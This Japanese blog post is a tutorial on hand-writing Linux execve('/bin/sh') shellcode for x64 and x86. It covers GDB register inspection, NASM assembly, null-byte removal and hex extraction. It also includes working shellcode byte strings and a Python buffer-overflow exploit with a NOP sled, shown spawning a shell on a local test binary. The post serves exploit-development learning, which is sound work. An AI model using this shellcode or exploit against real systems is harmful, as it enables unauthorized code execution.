+++
date = 2024-06-25
title = "貴方は何故シェルコードを作成しないのか"
[taxonomies]
tags = ["Tech", "Asm", "Pwn", "C"]
+++
# はじめに
タイトルは**ネタ**です。内容はネタじゃありませんが。
つまりシェルコードを作成の手順を書いていきます。
基本的には[小物三下](https://note.com/pien2021/n/n40ec68726989)さんと[ももいろテクノロジー](https://inaz2.hatenablog.com/entry/2014/03/13/013056)さんの記事をなぞっています。

# 開発環境
```
OS: EndeavourOS x86_64
Kernel: Linux 6.6.34-1-lts
Shell: bash 5.2.26
Terminal: xfce4-terminal 1.1.3
gcc: 14.1.1
gdb: 14.2 (+pwndbg)
NASM: 2.16.03
ld: 2.42.0
```

# シェルコードって何って人
シェルを起動するコードのことです。Linuxで言えば`/bin/sh`にあるシェル(Bashとか)を`execve`システムコールなどによって起動する機械語を指します。なぜ機械語なのかと言うと、シェルコードはBOFなどの脆弱性を通じて、メモリに直接注入する必要があるからです。また機械語はアセンブリと一対一に対応していますから、`/bin/sh`を`execve`システムコールで実行するアセンブリコード(実質的にシェルコード)を書けば、あとは自動的に機械語のシェルコードが得られるということです。

# x64(ELF)用シェルコード作成
まずは以下のように`execve`で`/bin/sh`を呼び出すCプログラムを作成します。
```c
/* shell_exec_x64.c */
#include <unistd.h>

int main(void) {
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}
```

またコンパイルオプションは以下の通りです。
```
$ gcc -static -o shell_exec_x64 shell_exec_x64.c
```

簡単な話、この時点で作成されたシェルを起動するプログラムの、特に`execve`システムコール直前のレジスタの値(引数)をチェックすることで、シェル起動に必要最低限なアセンブリを記述することができます。

ではGDBで`execve`システムコール直前にブレイクポイントを貼り、レジスタの内容を確認してみましょう。

```
$ gdb -q shell_exec_x64

pwndbg> disassemble execve
Dump of assembler code for function execve:
   0x0000000000410d60 <+0>:     endbr64
   0x0000000000410d64 <+4>:     mov    eax,0x3b
   0x0000000000410d69 <+9>:     syscall
   0x0000000000410d6b <+11>:    cmp    rax,0xfffffffffffff001
   0x0000000000410d71 <+17>:    jae    0x410d74 <execve+20>
   0x0000000000410d73 <+19>:    ret
   0x0000000000410d74 <+20>:    mov    rcx,0xffffffffffffffc0
   0x0000000000410d7b <+27>:    neg    eax
   0x0000000000410d7d <+29>:    mov    DWORD PTR fs:[rcx],eax
   0x0000000000410d80 <+32>:    or     rax,0xffffffffffffffff
   0x0000000000410d84 <+36>:    ret
End of assembler dump.
pwndbg> b *0x0000000000410d69
Breakpoint 1 at 0x410d69
pwndbg> r
Breakpoint 1, 0x0000000000410d69 in execve ()
pwndbg> i r
rax            0x3b                59
rbx            0x1                 1
rcx            0x7fffffffe1d0      140737488347600
rdx            0x0                 0
rsi            0x7fffffffe1d0      140737488347600
rdi            0x479010            4689936
rbp            0x7fffffffe1f0      0x7fffffffe1f0
rsp            0x7fffffffe1c8      0x7fffffffe1c8
r8             0x110               272
r9             0x4                 4
r10            0x478120            4686112
r11            0xf                 15
r12            0x7fffffffe308      140737488347912
r13            0x7fffffffe318      140737488347928
r14            0x49ff28            4849448
r15            0x1                 1
rip            0x410d69            0x410d69 <execve+9>
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x4ac380            4899712
gs_base        0x0                 0
```
x64では、引数は順番に`rdi, rsi, rdx, ...`と取られていきます。また、ソースコード中の`execve(argv[0], argv, NULL)`より、このシステムコールは３つの引数を取ることが分かります。

よって`rdi`が`argv[0](/bin/sh)`、`rsi`が`argv`、`rdx`が`NULL(0)`に対応していると分かります。つまり、`execve`で`/bin/sh`を呼び出すには、この３つのレジスタをそれぞれ前述した状態にセットする必要があるということです。

また、x64アセンブリにおけるシステムコールでは`rax`にシステムコール番号を格納する必要があります。今回は`0x3b`であるようです。

また、
```
pwndbg> x/s $rdi
0x479010:       "/bin/sh"
pwndbg> x/10wx $rsi
0x7fffffffe1d0: 0x00479010      0x00000000      0x00000000      0x00000000
0x7fffffffe1e0: 0xffffe200      0x00007fff      0xfb551f00      0xba63962a
0x7fffffffe1f0: 0xffffe290      0x00007fff
```
より`rsi`は`rdi`が持つアドレスとNULL(0)を持っていることも分かります。

そして、`execve`システムコールを使用して、シェルを呼び出すアセンブリを書く際に、スタックを利用して引数を管理するなら、作成するスタックの状態は以下のようになるはずです。
```
stack(上がアドレス0とすると、下に向かうにつれてアドレスは増えていく)

------- <- rsi
rdiの値
0
------- <- rdi
hs/nib/
0
```

どういうことかというと、まずはスタックへ`/bin/sh`とナル終端`0`をプッシュし、スタックトップを`rdi`に指させています。これによって`rdi`が`/bin/sh`を指していることになります。

次に`rsi`を作るために、ナルに相当する`0`をプッシュします。次に`rdi`が持つスタックのアドレスをプッシュして、その時点でのスタックトップを`rsi`に指させることで、
```
rsi = {rdiが持つ/bin/shへのアドレス, NULL}
```
という状態を作り出します。

(おさらい : 値をプッシュすると、スタックトップを指す`rsp`は、そのアドレスを減算するため、スタックトップは値がプッシュされたりポップされると変化します)

最後に`rdx`を`xor`でゼロクリアし、`rax`にシステムコール番号である`0x3b`を設定すれば`syscall`でシェルが呼び出せるというわけです。

では実際に、これをアセンブリで記述してみましょう。
```
; shellcode_x64.asm

global _start

section .text
_start:
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp

    push rdx
    push rdi
    mov rsi, rsp

    xor rax, rax
    mov al, 0x3b
    syscall
```

あとは以下の通りにアセンブルしてリンクします。
```
$ nasm -f elf64 shellcode_x64.asm 
$ ld -o shellcode_x64 shellcode_x64.o
```

バイナリができたら実行してみましょう。
```
$ ./shellcode_x64
sh-5.2$ echo hi
hi
sh-5.2$ exit
exit
$
```
シェルの起動が確認できました。

あとはシェルコードとしての体裁を整えるだけです。
(つまりPythonとかPerlとかにコピペして使えるバイナリ表現がほしい。)
`shellcode_x64`の中身は、先程記述した`shellcode_x64.asm`の機械語表現なだけなので、`shellcode_x64`の中身をそのまま取り出せば、`shellcode_x64.asm`と同じ処理をしてくれるバイナリが取り出せるというわけです。

早速取り出してみましょう。
ももいろテクノロジーさんのシェルスクリプトをお借りして以下のようにコマンドを打ちます。(objdump必須)
```
$ objdump -M intel -d ./shellcode_x64 | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
```
そうすれば以下のように見慣れたシェルコードを取り出すことができました。
```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
```

ちょっと`objdump`で確認してみましょう。
```
$ objdump -D -M intel shellcode_x64

shellcode_x64:     ファイル形式 elf64-x86-64


セクション .text の逆アセンブル:

0000000000401000 <_start>:
  401000:       48 31 d2                xor    rdx,rdx
  401003:       52                      push   rdx
  401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f6e69622f
  40100b:       73 68 00 
  40100e:       50                      push   rax
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       52                      push   rdx
  401013:       57                      push   rdi
  401014:       48 89 e6                mov    rsi,rsp
  401017:       48 31 c0                xor    rax,rax
  40101a:       b0 3b                   mov    al,0x3b
  40101c:       0f 05                   syscall
```
`objdump`の機械語の出力部分と、シェルスクリプトによる出力は一致しているので、正しそうです。

# ナルバイト削除
シェルコードはBOFの脆弱性をついて注入するものですが、もしBOF脆弱性を持つ関数が文字列に関する関数であった場合、ナルバイトが存在すると、それが終端文字と判断されて、入力が打ち切られてしまいます。
つまりシェルコードにナルバイトは存在しないほうが良いのです。

そして、上記シェルコードにはナルバイトが存在します。よってこれを削除しましょう。
ナルバイトが存在する箇所は以下です。
```
401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f6e69622f
40100b:       73 68 00 
```
これはアセンブリにおいて、`rax`へ`/bin/sh`を逆順で与えている命令となりますが、どうやら1バイト足りておらず、ナルバイトが埋め草として使われているようです。この場合`/bin/sh`を等価である`/bin//sh`に書き換えることで対処します。

まずはアセンブリを変更します。
```
;shellcode_x64.asm

global _start

section .text
_start:
	xor rdx, rdx
	push rdx
	mov rax, 0x68732f2f6e69622f ; /bin//sh
	push rax
	mov rdi, rsp

	push rdx
	push rdi
	mov rsi, rsp

	xor rax, rax
	mov al, 0x3b
	syscall
```

次に、アセンブルとリンクをもう一度行って確認してみます。
```
$ nasm -f elf64 shellcode_x64.asm 
$ ld -o shellcode_x64 shellcode_x64.o
$ objdump -D -M intel shellcode_x64

shellcode_x64:     ファイル形式 elf64-x86-64


セクション .text の逆アセンブル:

0000000000401000 <_start>:
  401000:       48 31 d2                xor    rdx,rdx
  401003:       52                      push   rdx
  401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f2f6e69622f
  40100b:       2f 73 68 
  40100e:       50                      push   rax
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       52                      push   rdx
  401013:       57                      push   rdi
  401014:       48 89 e6                mov    rsi,rsp
  401017:       48 31 c0                xor    rax,rax
  40101a:       b0 3b                   mov    al,0x3b
  40101c:       0f 05                   syscall
```
ナルバイトが消えていることが確認できました。

これで完成なので、またお借りしたスクリプトで取り出してみましょう。

```
$ objdump -M intel -d ./shellcode_x64 | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
```

```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
```
これがx64(ELF)用のシェルスクリプトとなりました。

# x86(ELF)用シェルコードの作成
32bit用のシェルコードもついでに作成してしまいましょう。

まずは先程と同じCコードを利用します。
```
/* shell_exec_x86.c */
#include <unistd.h>

int main(void) {
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}
```
コンパイルオプションは以下のとおりです。
```
$ gcc -o shell_exec_x86 shell_exec_x86.c -static -m32
```

GDBで同じように`execve`をディスアセンブルして見てみます。
```
gdb -q shell_exec_x86

pwndbg> disassemble execve
   0x08054220 <+0>:     push   ebx
   0x08054221 <+1>:     mov    edx,DWORD PTR [esp+0x10]
   0x08054225 <+5>:     mov    ecx,DWORD PTR [esp+0xc]
   0x08054229 <+9>:     mov    ebx,DWORD PTR [esp+0x8]
   0x0805422d <+13>:    mov    eax,0xb
   0x08054232 <+18>:    call   DWORD PTR gs:0x10
   0x08054239 <+25>:    pop    ebx
   0x0805423a <+26>:    cmp    eax,0xfffff001
   0x0805423f <+31>:    jae    0x8058c30 <__syscall_error>
   0x08054245 <+37>:    ret
```

特に
```
    0x08054232 <+18>:    call   DWORD PTR gs:0x10
```
この部分が怪しいので、ここにブレイクポイントを貼って実行し、停止したらレジスタを見てみましょう。

```
pwndbg> b *0x08054232
pwndbg> r

Breakpoint 1, 0x08054232 in execve ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
*EAX  0xb
*EBX  0x80b4018 ◂— '/bin/sh'
*ECX  0xffffd314 —▸ 0x80b4018 ◂— '/bin/sh'
 EDX  0
*EDI  1
*ESI  0x80e6ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0
*EBP  0xffffd328 —▸ 0xffffd438 ◂— 0
*ESP  0xffffd2f8 —▸ 0x80e6ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0
*EIP  0x8054232 (execve+18) ◂— call dword ptr gs:[0x10]
```
pwndbgは親切にも、その時のレジスタの状態を表示してくれます。
そして、これを見る限り、`ebx`が`/bin/sh`こと`argv[0]`に対応し、`ecx`が`argv`こと`{"/bin/sh", NULL}`に対応し、`edx`が`NULL`こと0に対応していると分かります。またシステムコール番号は`0xb`であるようです。

あとは前回と同じようにこれをセットし、システムコールを発行すれば良いでしょう。
(32bitは`syscall`ではなく`int 0x80`がシステムコールに対応します。)

よって以下のようにアセンブリコードを作成します。
```
; shellcode_x86.asm
global _start
section .text

_start:
	xor edx, edx

	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	push edx
	push ebx
	mov ecx, esp

	xor eax, eax
	mov al, 0xb
	int 0x80
```

そして、以下のようにシェルを32ビット対応で起動するバイナリを作成、実行してみます。
```
$ nasm -f elf -o shellcode_x86.o shellcode_x86.asm
$ ld -m elf_i386 -o shellcode_x86 shellcode_x86.o
$ ./shellcode_x86
sh-5.2$ echo hi
hi
sh-5.2$ exit
exit
$
```
正しく作成できていそうです。

ではシェルコードとしての体裁を整えていきましょう。
```
objdump -M intel -d shellcode_x86 | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
```
作成されたシェルコードは以下のとおりです。
```
\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80
```

# シェルコードを試してみる
前回投稿した記事において、BOFやカナリアの排除、実行可能スタックなどの脆弱性があるバイナリ`vuln`に対する攻撃を行っていましたが、その時は`pwntools`が生成するシェルコードを使用していました。次は自身で作成したシェルコードを利用してみたいと思います。

具体的には`alt.exploit.py`を以下のように改造します。
```python
# my_shellcode_exploit.py

from pwn import *
import sys
import struct

def gen_payload_file(payload):
    f = open('payload2', 'wb')
    f.write(payload)
    f.close()

nop_sled = b'\x90' * 146

# 26byte
shellcode = b'\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80'

# 144 byte = 4 * 36
return_addr = struct.pack('I', 0xffffd374) * 36

payload = nop_sled + shellcode + return_addr
sys.stdout.buffer.write(payload)
```
戻りアドレスは適宜変更する必要があります。
実行してみましょう。
```
$ (python3 my_shellcode_exploit.py; cat) | ./vuln
Overflow me : &buff = 0xffffd374
ls
ls
Makefile        exploit.py  my_shellcode_exploit.py  source.c  vuln
alt_exploit.py  hex         orig_exploit.py          test
ls
Makefile        exploit.py  my_shellcode_exploit.py  source.c  vuln
alt_exploit.py  hex         orig_exploit.py          test
whoami
figaro
echo hi
hi
^C
$
```
しっかり動作しているようです。

# 番外編
作成したシェルコードからシェルコードのオペコードとそのバイト数を取り出す簡単なシェルスクリプトを作成しました。(objdumpが必要ですが)


```bash
#!/bin/sh

#xopcodes.sh

if [ ! -e "$1" ]; then
	echo "[+] Error : file does not exists"
	exit 1
fi

opcodes=$(objdump -M intel -d $1 | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g')
oplen=$(echo -n "$opcodes" | grep -o '\\x' | wc -l)

echo "opcodes : $opcodes"
echo "length  : $oplen"
```

機械語を取り出すところまでは同じですが、さらにバイト数を数える処理を追加してシェルスクリプトとしたものです。

# 最後に
もっと小さいシェルコードの作成などにも挑戦してみたいところです。何かありましたらご指摘ください。
